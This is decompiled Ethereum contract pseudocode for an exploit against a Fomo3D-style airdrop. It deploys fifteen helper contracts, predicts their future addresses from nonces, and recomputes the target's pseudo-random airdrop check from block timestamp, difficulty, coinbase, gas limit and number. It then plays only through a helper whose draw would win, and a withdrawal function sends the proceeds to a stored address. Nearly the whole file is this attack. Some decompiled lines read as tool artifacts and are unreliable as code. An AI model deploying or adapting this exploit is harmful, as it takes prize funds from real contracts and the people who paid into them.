contract main {




// =====================  Runtime code  =====================


address stor0;
address sub_4fe6f55fAddress;
array of address sub_6a11455a;
array of uint256 nonces;

function nonces(uint256 arg1) {
    require arg1 < nonces.length
    return nonces[arg1]
}

function sub_4fe6f55f(?) {
    return sub_4fe6f55fAddress
}

function sub_6a11455a(?) {
    require arg1 < sub_6a11455a.length
    return sub_6a11455a[arg1]
}

function _fallback() payable {
    revert
}

function get() {
    call stor0 with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function sub_324704b9(?) {
    idx = 0
    while idx < 15:
        mem[96 len 500] = code.data[1986 len 500]
        create contract with 0 wei
                        code: code.data[1986 len 500]
        if not create.new_address:
            revert with ext_call.return_data[0 len return_data.size]
        sub_6a11455a.length++
        sub_6a11455a[sub_6a11455a.length] = address(create.new_address)
        nonces.length++
        mem[0] = 3
        nonces[nonces.length] = 1
        idx = idx + 1
        continue 
}

function LetsGo() payable {
    mem[64] = 96
    require msg.value == 10^17
    require ext_code.size(sub_4fe6f55fAddress)
    call sub_4fe6f55fAddress.airDropPot_() with:
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_code.size(sub_4fe6f55fAddress)
    call sub_4fe6f55fAddress.airDropTracker_() with:
         gas gas_remaining wei
    mem[96] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] >= 4 * 10^17
    s = 0
    idx = 0
    while idx < sub_6a11455a.length:
        require idx < nonces.length
        mem[0] = 3
        _59 = mem[64]
        mem[mem[64] + 32] = address(sha3(0, 0, sub_6a11455a[idx], nonces[idx]))
        _60 = mem[64]
        mem[mem[64]] = 20
        mem[64] = mem[64] + 52
        _62 = mem[_60]
        t = _60 + 32
        u = _59 + 52
        s = mem[_60]
        while s >= 32:
            mem[u] = mem[t]
            t = t + 32
            u = u + 32
            s = s - 32
            continue 
        mem[_59 + floor32(mem[_60]) + 52] = mem[_59 + floor32(mem[_60]) + 52] and 256^(-(mem[_60] % 32) + 32) - 1 or mem[_60 + floor32(mem[_60]) + 32] and !(256^(-(mem[_60] % 32) + 32) - 1)
        _102 = sha3(mem[_59 + 52 len _62])
        require block.timestamp
        mem[_59 + 84] = address(block.coinbase)
        mem[_59 + 52] = 20
        mem[64] = _59 + 104
        t = _59 + 84
        u = _59 + 104
        s = 20
        while s >= 32:
            mem[u] = mem[t]
            t = t + 32
            u = u + 32
            s = s - 32
            continue 
        mem[_59 + 104] = mem[_59 + 124 len 12] or Mask(160, 96, mem[_59 + 84])
        require block.timestamp
        if block.difficulty + block.timestamp < block.timestamp:
            revert with 0, 'SafeMath add failed'
        if sha3(mem[_59 + 104 len 20]) / block.timestamp < 0:
            revert with 0, 'SafeMath add failed'
        if block.gas_limit < 0:
            revert with 0, 'SafeMath add failed'
        if _102 / block.timestamp < 0:
            revert with 0, 'SafeMath add failed'
        if block.number < 0:
            revert with 0, 'SafeMath add failed'
        mem[_59 + 136] = block.number + (_102 / block.timestamp) + block.gas_limit + (sha3(mem[_59 + 104 len 20]) / block.timestamp) + block.difficulty + block.timestamp
        mem[_59 + 104] = 32
        mem[64] = _59 + 168
        t = _59 + 136
        u = _59 + 168
        s = 32
        while s >= 32:
            mem[u] = mem[t]
            t = t + 32
            u = u + 32
            s = s - 32
            continue 
        if sha3(mem[_59 + 168]) - (1000 * sha3(mem[_59 + 168]) / 1000) >= ext_call.return_data[0]:
            s = sub_6a11455a[idx]
            idx = idx + 1
            continue 
        require ext_code.size(sub_6a11455a[idx])
        call sub_6a11455a[idx].0xfeba894c with:
           value msg.value wei
             gas gas_remaining wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require idx < nonces.length
        nonces[idx]++
        require msg.value + eth.balance(stor0) < eth.balance(stor0)
    require msg.value + eth.balance(stor0) < eth.balance(stor0)
}



}
